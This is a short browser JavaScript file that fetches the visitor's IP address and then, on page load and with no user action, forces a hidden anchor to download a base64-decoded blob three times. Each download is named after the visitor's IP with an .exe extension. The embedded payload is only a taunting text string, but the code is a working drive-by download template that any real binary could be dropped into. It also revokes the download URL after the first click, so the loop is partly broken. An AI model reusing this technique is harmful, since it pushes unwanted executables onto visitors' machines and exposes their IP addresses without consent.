const span = document.getElementById("span");
var ip;
const getIP = async () => {
  await fetch("https://api.ipify.org/?format=json")
    .then((result) => result.json())
    .then((data) => {
      ip = data.ip;
      console.log(ip);
    })
    .finally(() => {
      span.textContent = ip;
    });
  return ip;
};

function start() {
  return getIP();
}

var filedata = "bG9sIGdvdCB1IGdvb2QgOik=";

function base64tobytes(b64data) {
  var binary_values = atob(b64data);
  var binary_length = binary_values.length;
  var bytes_data = new Uint8Array(binary_length);

  for (var i = 0; i < binary_length; i++) {
    bytes_data[i] = binary_values.charCodeAt(i);
  }

  return bytes_data.buffer;
}

var filebytes = base64tobytes(filedata);

// Blob and anchor element
var blob = new Blob([filebytes], { type: "octet/stream" });
var anchor = document.createElement("a");
document.body.append(anchor);
anchor.style = "display: none;";

var url = window.URL.createObjectURL(blob);

(async () => {
  for (var i = 0; i < 3; i++) {
    var result = await start();
    var filename = result + ".exe";
    anchor.href = url;
    anchor.download = filename;

    // Force click and download
    anchor.click();
    window.URL.revokeObjectURL(url);
  }
})();
